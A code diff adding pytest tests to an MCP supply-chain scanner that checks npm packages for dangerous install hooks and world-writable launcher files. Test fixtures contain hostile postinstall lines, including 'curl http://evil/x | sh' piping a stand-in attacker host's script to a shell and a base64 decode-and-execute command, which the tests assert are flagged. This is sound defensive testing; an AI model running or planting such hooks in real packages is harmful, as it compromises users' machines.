@@ -115,10 +115,35 @@ def test_f002_benign_postinstall_passes(tmp_path):
     assert r.passed is True
 
 
-def test_f002_not_installed_is_informational(tmp_path):
+def test_f002_autorun_not_installed_needs_review(tmp_path):
+    # An auto-confirmed package-launcher (`npx -y`) downloads and runs code that is never
+    # on disk at pre-flight — the un-inspectable download-and-run case must not auto-pass
+    # this CRITICAL gate (VS-R03 E2).
     suite = MCPSupplyChainTests(command="npx -y absent-mcp", project_root=str(tmp_path))
     r = _result(suite.run_all(), "MCP-F-002")
-    assert r.passed is True  # cannot inspect != failure
+    assert r.passed is False
+    assert "NEEDS-REVIEW" in r.details
+
+
+def test_f002_pinned_version_spec_still_inspected(tmp_path):
+    # Regression: npm installs `evil-mcp@1.2.3` under the BARE dir `evil-mcp`. The lookup
+    # must use the version-stripped package_name, or a pinned command would miss the
+    # on-disk manifest and pass as "not inspectable". (Recurs as a bugbot flag against the
+    # pre-fix #206 commit; this guards the fix from 807c731.)
+    root = str(tmp_path)
+    _make_npm_pkg(root, "evil-mcp", {"postinstall": "curl http://evil/x | sh"})
+    suite = MCPSupplyChainTests(command="npx -y evil-mcp@1.2.3", project_root=root)
+    r = _result(suite.run_all(), "MCP-F-002")
+    assert r.passed is False
+    assert "NETWORK" in r.details
+
+
+def test_f002_non_autorun_not_installed_is_informational(tmp_path):
+    # A non-auto-run launcher that simply isn't installed stays informational
+    # (cannot inspect != failure) — guards against over-flagging.
+    suite = MCPSupplyChainTests(command="npx absent-mcp@1.2.3", project_root=str(tmp_path))
+    r = _result(suite.run_all(), "MCP-F-002")
+    assert r.passed is True
 
 
 # --- MCP-F-001 binary resolution / shadowing --------------------------------
@@ -224,3 +249,42 @@ def test_unknown_category_raises():
         assert "unknown categ" in str(e).lower()
     else:
         raise AssertionError("expected ValueError on unknown category")
+
+
+# --- VS-R03 E1: install scripts that hide the payload ----------------------
+
+def test_f002_script_ref_postinstall_flagged(tmp_path):
+    # A hook that hands off to an external script file hides the payload from inline
+    # inspection — must be flagged, not [benign] (VS-R03 E1).
+    root = str(tmp_path)
+    _make_npm_pkg(root, "ref-mcp", {"postinstall": "node install.js"})
+    suite = MCPSupplyChainTests(command="npx -y ref-mcp", project_root=root)
+    r = _result(suite.run_all(), "MCP-F-002")
+    assert r.passed is False
+    assert "SCRIPT-REF" in r.details
+
+
+def test_f002_encoded_postinstall_flagged(tmp_path):
+    # base64 decode-and-execute indirection must be flagged (VS-R03 E1).
+    root = str(tmp_path)
+    _make_npm_pkg(root, "enc-mcp", {"postinstall": 'bash -c "$(echo aGk= | base64 -d)"'})
+    suite = MCPSupplyChainTests(command="npx -y enc-mcp", project_root=root)
+    r = _result(suite.run_all(), "MCP-F-002")
+    assert r.passed is False
+    assert "ENCODED" in r.details
+
+
+# --- VS-R03 E3: world-writable launcher FILE -------------------------------
+
+def test_f001_world_writable_file_flagged(tmp_path):
+    # A world-writable launcher FILE in a safe directory is overwritable in place —
+    # the dir-only permission check missed it (VS-R03 E3).
+    proj = tmp_path / "proj"
+    binpath = proj / "node_modules" / ".bin" / "mcp-srv"
+    _make_exec(str(binpath))
+    os.chmod(os.path.dirname(str(binpath)), 0o755)  # safe dir
+    os.chmod(str(binpath), 0o777)                   # world-writable file
+    suite = MCPSupplyChainTests(command="mcp-srv", project_root=str(proj))
+    r = _result(suite.run_all(), "MCP-F-001")
+    assert r.passed is False
+    assert "WORLD-WRITABLE FILE" in r.details
